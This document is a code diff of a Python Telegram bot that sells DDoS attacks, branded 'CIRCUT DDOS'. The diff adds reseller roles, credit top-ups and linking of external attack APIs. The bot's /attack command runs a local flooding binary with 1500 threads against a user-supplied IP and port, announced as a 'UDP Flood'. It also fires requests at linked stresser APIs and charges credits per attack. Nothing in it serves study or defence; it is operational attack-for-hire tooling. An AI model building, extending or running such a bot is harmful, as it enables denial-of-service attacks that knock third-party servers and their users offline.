@@ -1,9 +1,11 @@
 import os
+import json
 import telebot
 import requests
 import logging
 import time
 from pymongo import MongoClient
+from datetime import datetime
 import certifi
 from threading import Thread, Lock
 import asyncio
@@ -22,22 +24,26 @@ BINARY_NAME = "./bgmi"
 
 bot = telebot.TeleBot(TOKEN)
 
-# MongoDB Setup
+# Initialize MongoDB
 try:
     client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
     db = client['danger']
-    users_collection = db.users
-    api_collection = db.apis 
-    admins_collection = db.admins 
-    settings_collection = db.settings
+    users_collection, api_collection = db.users, db.apis 
+    admins_collection, settings_collection = db.admins, db.settings
 except Exception as e:
     exit(1)
 
+# Global Variables
 active_attacks = [] 
 attack_lock = Lock()
 DEFAULT_THREADS = 1500 
 
 # --- HELPERS ---
+def get_user_role(user_id):
+    if user_id == PRIMARY_ADMIN: return "owner"
+    admin_data = admins_collection.find_one({"user_id": user_id})
+    return admin_data.get("role") if admin_data else "user"
+
 def get_settings():
     settings = settings_collection.find_one({"id": "bot_settings"})
     if not settings:
@@ -52,60 +58,67 @@ def create_inline_keyboard():
     markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
     return markup
 
-# --- ATTACK ENGINE (ACCURATE SLOTS) ---
-async def run_attack_task(chat_id, ip, port, dur, atk_id):
-    global active_attacks
-    cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {ip} {port} {dur} {DEFAULT_THREADS}"
-    
-    # Trigger External APIs
-    for api in list(api_collection.find()):
-        try: requests.get(f"https://{api['url']}/api?key={api['key']}&host={ip}&port={port}&time={dur}", timeout=4)
-        except: pass
-
-    try:
-        process = subprocess.Popen(cmd, shell=True)
-        await asyncio.sleep(dur)
-        process.terminate()
-    finally:
-        with attack_lock:
-            if atk_id in active_attacks:
-                active_attacks.remove(atk_id) # Slot free karke update karega
-        bot.send_message(chat_id, "✅ *ATTACK FINISHED!*", reply_markup=create_inline_keyboard(), parse_mode='Markdown')
-
-# --- COMMANDS ---
+# --- COMMANDS (FIXED FOR CLICK TO USE) ---
 
 @bot.message_handler(commands=['start', 'help'])
-def help_command(message):
+def help_cmd(message):
+    # Blue link format for "Click to Use"
     help_text = (
         "🌟 *CIRCUT DDOS COMMANDS* 🌟\n\n"
-        "🚀 `/attack ip port time` - Launch\n"
-        "📊 `/status` - Check Slots\n"
-        "👤 `/myinfo` - Credits Check\n"
-        "👑 `/maxtime time` - Set Limit\n"
-        "🎰 `/addslot num` - Set Slots"
+        "🚀 /attack ip port time - Launch\n"
+        "📊 /status - Check Slots\n"
+        "👤 /myinfo - Credits Check\n"
+        "👑 /maxtime time - Set Limit\n"
+        "🎰 /addslot num - Set Slots\n"
+        "🤝 /addcredits id amt - Add Credits\n"
+        "🔗 /apiurl url key - Link API"
     )
     bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
 
 @bot.message_handler(commands=['status'])
 def status_cmd(message):
-    settings = get_settings()
-    with attack_lock:
-        used = len(active_attacks)
-    bot.send_message(message.chat.id, f"📊 *STATUS:* {'BUSY' if used >= settings['total_slots'] else 'READY'}\n🚀 *Active Attacks:* `{used}/{settings['total_slots']}`\n⏱️ *Limit:* `{settings['max_time']}s`", parse_mode='Markdown')
+    setts = get_settings()
+    with attack_lock: used = len(active_attacks)
+    bot.send_message(message.chat.id, f"📊 *Used Slots:* `{used}/{setts['total_slots']}`", parse_mode='Markdown')
+
+@bot.message_handler(commands=['myinfo'])
+def myinfo(message):
+    data = users_collection.find_one({"user_id": message.from_user.id})
+    credits = data.get('credits', 0) if data else 0
+    bot.send_message(message.chat.id, f"💳 *Credits:* `{credits}`\n🎭 *Role:* `{get_user_role(message.from_user.id).upper()}`", parse_mode='Markdown')
+
+# --- ATTACK ENGINE (ACCURATE SLOTS & BOX) ---
+
+async def run_attack_task(chat_id, ip, port, dur, atk_id):
+    global active_attacks
+    cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {ip} {port} {dur} {DEFAULT_THREADS}"
+    
+    for api in list(api_collection.find()):
+        try: requests.get(f"https://{api['url']}/api?key={api['key']}&host={ip}&port={port}&time={dur}", timeout=4)
+        except: pass
+
+    try:
+        p = subprocess.Popen(cmd, shell=True)
+        await asyncio.sleep(dur)
+        p.terminate()
+    finally:
+        with attack_lock:
+            if atk_id in active_attacks: active_attacks.remove(atk_id)
+        bot.send_message(chat_id, "✅ *ATTACK FINISHED!*", reply_markup=create_inline_keyboard(), parse_mode='Markdown')
 
 @bot.message_handler(commands=['attack'])
 def attack_cmd(message):
     user_id = message.from_user.id
     user_data = users_collection.find_one({"user_id": user_id})
     setts = get_settings()
-
+    
     if not user_data or user_data.get('credits', 0) < 5:
-        bot.send_message(message.chat.id, "🚫 *Credits Low!*", reply_markup=create_inline_keyboard())
+        bot.send_message(message.chat.id, "🚫 *Need 5 credits!*")
         return
 
     with attack_lock:
         if len(active_attacks) >= setts['total_slots']:
-            bot.send_message(message.chat.id, "⚠️ *All Slots Full!*", reply_markup=create_inline_keyboard())
+            bot.send_message(message.chat.id, "⚠️ *Slots Full!* Check /status")
             return
 
     args = message.text.split()
@@ -116,42 +129,40 @@ def attack_cmd(message):
     try:
         ip, port, dur = args[1], int(args[2]), int(args[3])
         if dur > setts['max_time']:
-            bot.send_message(message.chat.id, f"❌ *Max time: {setts['max_time']}s*")
+            bot.send_message(message.chat.id, f"❌ Max: {setts['max_time']}s")
             return
 
         users_collection.update_one({"user_id": user_id}, {"$inc": {"credits": -5}})
         atk_id = f"{ip}_{port}_{time.time()}"
+        with attack_lock: active_attacks.append(atk_id)
         
-        with attack_lock:
-            active_attacks.append(atk_id) # Slot occupy ho gaya
-
-        # BOX DESIGN MESSAGE
-        box_msg = (
-            f"```\n"
-            f"╔══════════════════════════════════════╗\n"
-            f"║          ⚡ ATTACK STARTED ⚡         ║\n"
-            f"╠══════════════════════════════════════╣\n"
-            f"║  🎯 Target:  {ip:<23} ║\n"
-            f"║  🔌 Port:    {port:<23} ║\n"
-            f"║  ⏱️ Time:    {dur:<23} ║\n"
-            f"║  🛠️ Method:  UDP Flood               ║\n"
-            f"╚══════════════════════════════════════╝\n"
-            f"```"
-        )
+        box_msg = (f"```\n╔══════════════════════════════════════╗\n║          ⚡ ATTACK STARTED ⚡         ║\n"
+                   f"╠══════════════════════════════════════╣\n║  🎯 Target:  {ip:<23} ║\n║  🔌 Port:    {port:<23} ║\n"
+                   f"║  ⏱️ Time:    {dur:<23} ║\n║  🛠️ Method:  UDP Flood               ║\n╚══════════════════════════════════════╝\n```")
         bot.send_message(message.chat.id, box_msg, parse_mode='Markdown')
         asyncio.run_coroutine_threadsafe(run_attack_task(message.chat.id, ip, port, dur, atk_id), attack_loop)
-    except:
-        bot.send_message(message.chat.id, "⚠️ Invalid input.")
+    except: pass
 
-@bot.message_handler(commands=['maxtime', 'addslot'])
-def admin_settings(message):
-    if message.from_user.id != PRIMARY_ADMIN: return
+# --- ADMIN COMMANDS ---
+
+@bot.message_handler(commands=['addowner', 'addreseller', 'apiurl', 'maxtime', 'addslot', 'addcredits'])
+def admin_handler(message):
+    if get_user_role(message.from_user.id) not in ["owner", "reseller"]: return
     args = message.text.split()
+    cmd = args[0].replace("/", "")
     try:
-        val = int(args[1])
-        key = "max_time" if "maxtime" in message.text else "total_slots"
-        settings_collection.update_one({"id": "bot_settings"}, {"$set": {key: val}}, upsert=True)
-        bot.send_message(message.chat.id, f"✅ {key} updated to `{val}`")
+        if cmd == 'maxtime':
+            settings_collection.update_one({"id": "bot_settings"}, {"$set": {"max_time": int(args[1])}}, upsert=True)
+            bot.send_message(message.chat.id, f"✅ Max time set to `{args[1]}`")
+        elif cmd == 'addslot':
+            settings_collection.update_one({"id": "bot_settings"}, {"$set": {"total_slots": int(args[1])}}, upsert=True)
+            bot.send_message(message.chat.id, f"✅ Slots set to `{args[1]}`")
+        elif cmd == 'addcredits':
+            users_collection.update_one({"user_id": int(args[1])}, {"$inc": {"credits": int(args[2])}}, upsert=True)
+            bot.send_message(message.chat.id, f"✅ Added credits to `{args[1]}`")
+        elif cmd == 'apiurl':
+            api_collection.update_one({"url": args[1]}, {"$set": {"key": args[2]}}, upsert=True)
+            bot.send_message(message.chat.id, "✅ API Linked.")
     except: pass
 
 # --- RUNNER ---
